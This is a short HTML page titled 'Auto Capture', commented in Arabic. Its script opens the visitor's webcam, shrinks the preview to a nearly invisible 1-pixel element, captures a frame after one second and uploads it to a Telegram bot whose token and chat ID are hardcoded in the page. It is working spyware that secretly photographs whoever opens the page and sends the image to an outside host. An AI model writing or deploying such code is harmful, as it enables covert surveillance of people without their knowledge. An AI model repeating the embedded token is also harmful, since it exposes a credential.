<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Auto Capture</title>
<style>
  video {
    width: 1px; 
    height: 1px; 
    opacity: 0.01; /* مخفي تقريباً */
  }
</style>
</head>
<body>

<video id="cam" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>

// ====== اعدادات البوت ======
const BOT_TOKEN = "8568730830:AAFBfR4JtzNvYP8CEz1m9WWLm4tYj0DJ1eec"; // تم تحديث الرمز
const CHAT_ID = "5728092443";
// ===========================


// فتح الكاميرا تلقائياً
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    const video = document.getElementById("cam");
    video.srcObject = stream;

    // التقط الصورة بعد 1 ثانية
    setTimeout(() => {
        autoCapture();
    }, 1000);
})
.catch(err => {
    console.log("Camera error:", err);
});


function autoCapture() {
    const video = document.getElementById("cam");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // رسم الصورة
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // تحويل الصورة Base64
    canvas.toBlob(blob => {
        sendPhoto(blob);
    }, "image/jpeg", 0.9);
}



// إرسال الصورة للبوت
function sendPhoto(blob) {

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "auto.jpg");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    })
    .then(r => r.json())
    .then(d => {
        console.log("Sent:", d);
    })
    .catch(err => {
        console.log("Send error:", err);
    });
}

</script>

</body>
</html>
